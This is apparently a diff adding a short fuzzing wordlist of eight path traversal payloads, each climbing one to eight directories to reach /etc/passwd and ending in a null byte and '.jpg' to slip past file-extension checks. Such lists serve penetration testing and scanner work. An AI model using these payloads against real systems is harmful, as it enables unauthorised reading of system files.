@@ -1,0 +1,8 @@
+../etc/passwd%00.jpg
+../../etc/passwd%00.jpg
+../../../etc/passwd%00.jpg
+../../../../etc/passwd%00.jpg
+../../../../../etc/passwd%00.jpg
+../../../../../../etc/passwd%00.jpg
+../../../../../../../etc/passwd%00.jpg
+../../../../../../../../etc/passwd%00.jpg
